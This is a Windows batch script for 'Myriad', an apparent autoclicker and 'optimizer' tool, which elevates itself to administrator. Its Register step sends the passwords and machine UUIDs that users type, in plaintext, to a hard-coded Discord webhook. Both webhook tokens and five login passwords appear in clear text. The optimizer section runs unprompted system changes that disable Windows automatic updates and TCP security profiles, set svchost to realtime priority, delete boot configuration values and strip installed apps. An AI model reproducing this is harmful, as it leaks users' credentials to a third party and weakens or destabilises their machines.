<# ::
@echo off
SETLOCAL EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)

title Administrator: Myriad > nul 2>&1
Mode 48,16
cd "%localappdata%/Myriad" > nul 2>&1
del /f %LOCALAPPDATA%\Myriad\nul\Myriad.bat > nul 2>&1

Reg.exe add HKLM /F > nul 2>&1
if %errorlevel% neq 0 start "" /wait /I /min powershell -NoProfile -Command start -verb runas "'%~s0'" && exit /b

set title=Myriad Created By Xhays
set version=1.0
set LUP=05/21/2023
set color=7

set myriado=https://discord.com/api/webhooks/1078481721802117160/Ut6dXr_ptHTV29YFy_DXgcWMWPrZyvR3-yTWNckV6ldI08SUOvr-lIqD6T19ZtqeGbdY
set myriadr=https://discord.com/api/webhooks/1078481492507897857/aJU6MxafSO7lukSyTtb26OW5dBb5Pq5pv0aM5fGRqQuc-LgCh4wIUWk3lqeCMrrb_C4w

set g=[92m
set r=[91m
set red=[04m
set l=[1m
set w=[0m
set b=[94m
set m=[95m
set p=[35m
set c=[35m
set d=[96m
set u=[0m
set z=[91m
set n=[96m
set y=[40;33m
set g2=[102m
set r2=[101m
set t=[40m

goto Loading

:MainMenu
cls
color %color%
title %title% > nul 2>&1
type MyriadLogo.txt
Batbox /h 0
Call Button 10 7 "Log in" 26 7 "Register" 18 11 "Contact" # Press
Getinput /m %Press% /h 70

:: Check for the pressed button 
if %errorlevel%==1 (goto Username)
if %errorlevel%==2 (goto Register)
if %errorlevel%==3 (goto Contact)
goto MainMenu

:Register
cls
color %color%
type MyriadLogo.txt
echo.
set /p usernamer=Username:
echo.
set /p passwordr=Password:
echo.
wmic path win32_computersystemproduct get uuid.
set /p uuidr=UUID [COPY]:
DSW.exe "%myriadr%" "**Myriad Registration:** Username: **%usernamer%** | Password: **%passwordr%** | UUID: **%uuidr%**" "Myriad Logs" > nul 2>&1
cls
color %color%
type MyriadLogo.txt
echo.
echo.
echo.
echo.
echo.
echo           %u%[%g%+%u%] %g%Successfully registered.
timeout /t 3 >nul & cls & goto MainMenu

:Contact
cls
color %color% > nul 2>&1
type MyriadLogo.txt
echo.
echo.
echo.
echo.
echo.
echo                     %b% Soon..
timeout /t 3 >nul & cls & goto MainMenu


:Username
cls
color %color%
type MyriadLogo.txt
echo.
echo.
set /p username=Username:
echo.
set /p password=Password:
if %username% == xhays if %password% == 220207 goto UUIDREGISTER
if %username% == awuen if %password% == sapo goto UUIDREGISTER
if %username% == brexy if %password% == miguel07 goto UUIDREGISTER
if %username% == alejo if %password% == alejogarcia0812 goto UUIDREGISTER
if %username% == havackas if %password% == JoaPas2019xD goto UUIDREGISTER

goto ERROR
echo.
echo.
:ERROR
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                    E
ping localhost -n 1 > nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                    E R
ping localhost -n 1 > nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                    E R R
ping localhost -n 1 > nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                    E R R O
ping localhost -n 1 > nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo                    E R R O R
ping localhost -n 2 > nul
cls
goto MainMenu

::==============================================================

:LoginMENUAC
cls
color %color%
title %title% > nul 2>&1
type MyriadLogo.txt
Batbox /h 0
Call Button 9 9 "AutoClick" 26 9 "Optimizer" # Press
Getinput /m %Press% /h 70

if %errorlevel%==1 (goto ACCMENU)
if %errorlevel%==2 (goto optimiZERSEX)
goto LoginMENUAC

:optimiZERSEX
call :ECHOX %r%fixing ping
netsh int tcp set global autotuninglevel=disabled
netsh int tcp set global autotuninglevel=normal
netsh int tcp set global ecncapability=disabled
netsh int tcp set global dca=enabled
netsh int tcp set global netdma=enabled
netsh int tcp set global rsc=disabled
netsh int tcp set global rss=enabled
netsh int tcp set global timestamps=disabled
netsh int tcp set global initialRto=2000
netsh int tcp set global nonsackrttresiliency=disabled
netsh int tcp set global maxsynretransmissions=2
netsh int tcp set security mpp=disabled
netsh int tcp set security profiles=disabled
netsh int tcp set heuristics disabled
netsh int ip set global neighborcachelimit=4096
wmic process where name="javaw.exe" CALL setpriority "realtime"
wmic process where name="svchost.exe" CALL setpriority "realtime"
wmic process where name="discord.exe" CALL setpriority "realtime"
wmic process where name="steam.exe" CALL setpriority "realtime"
wmic process where name="mqsvc.exe" CALL setpriority "high priority"
wmic process where name="mqtgsvc.exe" CALL setpriority "high priority"
wmic process where name="opera.exe" CALL setpriority "realtime"
bcdedit /deletevalue firstmegabytepolicy
bcdedit /deletevalue avoidlowmemory
bcdedit /deletevalue nolowmem
bcdedit /deletevalue configaccesspolicy
bcdedit /deletevalue x2apicpolicy
bcdedit /deletevalue usephysicaldestination
bcdedit /deletevalue usefirmwarepcisettings
bcdedit /deletevalue uselegacyapicmode
call :ECHOX powershell removing
PowerShell -Command "Get-AppxPackage *SkypeApp* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *BingNews* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Bingsports* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Phone* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Disney* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *3DBuilder* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsAlarms* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Bing* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *MicrosoftOfficeHub* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *People* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsPhone* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Solit* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsSoundRecorder* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsMaps* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Office.Sway* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *CommsPhone* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Facebook* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Twitter* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *GetHelp* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Getstarted* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Microsoft3DViewer* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *MicrosoftOfficeHub* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *MicrosoftSolitaireCollection* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *NetworkSpeedTest* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *News* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Office.Lens* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Office.OneNote* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *OneConnect* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Office.Todo.List* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Whiteboard* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsFeedbackHub* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *WindowsSoundRecorder* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *XboxApp* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *XboxGameOverlay* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *XboxIdentityProvider* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *XboxSpeechToTextOverlay* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *EclipseManager* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *ActiproSoftwareLLC* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *AdobeSystemsIncorporated.AdobePhotoshopExpress* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *PandoraMediaInc* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *CandyCrush* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Duolingo-LearnLanguagesforFree* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *BubbleWitch3Saga* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Wunderlist* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Flipboard* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Royal Revolt* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *Dolby* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *MicrosoftStickyNotes* | Remove-AppxPackage"
PowerShell -Command "Get-AppxPackage *BingWeather* | Remove-AppxPackage"
call :ECHOX activing regedits
Reg.exe add "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableSearchBoxSuggestions" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRecentDocsHistory" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "ShowRecent" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "ShowFrequent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v NoPreviousVersionsPage /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\WindowsSelfHost\UI\Visibility" /v "DiagnosticErrorText" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\WindowsSelfHost\UI\Strings" /v "DiagnosticErrorText" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\WindowsSelfHost\UI\Strings" /v "DiagnosticLinkText" /t REG_SZ /d "" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\TabletPC" /v "PreventHandwritingDataSharing" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\HandwritingErrorReports" /v "PreventHandwritingErrorReports" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableInventory" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v "DisableUAR" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\AdvertisingInfo" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Input\TIPC" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\PolicyManager\current\device\System" /v "AllowExperimentation" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\SQMClient\Windows" /v "CEIPEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Messaging" /v "AllowMessageSync" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Biometrics" /v "Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications" /v "ToastEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DeviceAccess\Global\{C1D23ACC-752B-43E5-8448-8D0E519CD6D6}" /v "Value" /t REG_SZ /d "Deny" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "Start_TrackProgs" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ShowSyncProviderNotifications" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /v "AllowCortana" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Speech_OneCore\Preferences" /v "MoDELDownloadAllowed" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\InputPersonalization\TrainedDataStore" /v "HarvestContacts" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Personalization\Settings" /v "AcceptedPrivacyPolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\DataCollection" /v "AllowTelemetry" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DELiveryOptimization" /v "DODownloadMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\DELiveryOptimization" /v "SystemSettingsDownloadMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Speech" /v "AllowSpeechMoDELUpdate" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DeferUpgrade" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DeferUpgradePeriod" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DeferUpdatePeriod" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Device Metadata" /v "PreventDeviceMetadataFromNetwork" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsStore\WindowsUpdate" /v "AutoDownload" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Siuf\Rules" /v "NumberOfSIUFInPeriod" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Siuf\Rules" /v "PeriodInNanoSeconds" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Search" /v "BingSearchEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDELiveryManager" /v "SilentInstalledAppsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\GraphicsDrivers\Scheduler" /v "VsyncIdleTimeout" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_Enabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehaviorMode" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_FSEBehavior" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_HonorUserFSEBehaviorMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DXGIHonorFSEWindowsCompatible" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_EFSEFeatureFlags" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\System\GameConfigStore" /v "GameDVR_DSEBehavior" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\GameDVR" /v "AppCaptureEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameDVR" /v "AllowgameDVR" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Intel\GMM" /v "DedicatedSegmentSize" /t REG_DWORD /d "1298" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "Win32PrioritySeparation" /t REG_DWORD /d "38" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ8Priority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\PriorityControl" /v "IRQ16Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v "EnableBoottrace" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoLowDiskSpaceChecks" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "LinkResolveIgnoreLinkInfo" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoResolveTrack" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoInternetOpenWith" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NtfsMftZoneReservation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NTFSDisable8dot3NameCreation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "NTFSDisableLastAccessUpdate" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\FileSystem" /v "ContigFileAllocSize" /t REG_DWORD /d "64" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsAll" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "GameFluidity" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGames" /t REG_DWORD /d "16" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Games" /v "FpsStatusGamesAll" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Games" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Affinity" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Background Only" /t REG_SZ /d "False" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Priority" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Scheduling Category" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "SFIO Priority" /t REG_SZ /d "High" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Low Latency" /v "Latency Sensitive" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "CPUPriority" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "FastDRAM" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "PCIConcur" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\System\CurrentControlSet\Services\VxD\BIOS" /v "AGPConcur" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "Max Cached Icons" /t REG_SZ /d "2000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "AlwaysUnloadDLL" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\AlwaysUnloadDLL" /v "Default" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "EnableBalloonTips" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\MSMQ\Parameters" /v "TCPNoDELay" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "ExtendedUIHoverTime" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DeferUpgrade" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\NetworkConnectivityStatusIndicator" /v "NoActiveProbe" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Maps" /v "AutoDownloadAndUpdateMapData" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableWindowsLocationProvider" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableLocationScripting" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors" /v "DisableLocation" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\GameUX" /v "DownloadGameInfo" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\System\CurrentControlSet\Control\CrashControl" /v "DisplayParameters" /t REG_DWORD /d "1" /f
Reg.exe add HKCU\CONSOLE /v VirtualTerminalLevel /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\Software\Policies\Microsoft\Windows\FileHistory" /v "Disabled" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy" /v "LetAppsSyncWithDevices" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy" /v "LetAppsAccessTrustedDevices" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy" /v "LetAppsAccessRadios" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy" /v "LetAppsAccessMotion" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy" /v "LetAppsAccessMessaging" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy" /v "LetAppsAccessLocation" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy" /v "LetAppsAccessContacts" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppPrivacy" /v "LetAppsAccessCallHistory" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Messenger\Client" /v "CEIP" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "AllowInputPersonalization" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DELiveryOptimization\Config" /v "DownloadMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /v "RunOnceHasShown" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /v "RunOnceComplete" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /v "DisableFirstRunCustomize" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\WindowsMediaPlayer" /v "PreventMusicFileMetadataRetrieval" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotification" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Messenger\Client" /v "CEIP" /t REG_DWORD /d "2" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Internet Explorer\Main" /v "RunOnceHasShown" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\Internet Explorer\Main" /v "DisableFirstRunCustomize" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitTextCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\InputPersonalization" /v "RestrictImplicitInkCollection" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\ContentDELiveryManager" /v "SoftLandingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main" /v "RunOnceHasShown" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main" /v "RunOnceComplete" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main" /v "DoNotTrack" /t REG_DWORD /d "1" /f
Reg.exe add "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main" /v "DisableFirstRunCustomize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "MetricsReportingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Google\Chrome" /v "ChromeCleanupReportingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\common" /v "qmenable" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\common" /v "sendcustomerdata" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\SOFTWARE\Policies\Microsoft\office\16.0\common" /v "updatereliabilitydata" /t REG_DWORD /d "0" /f
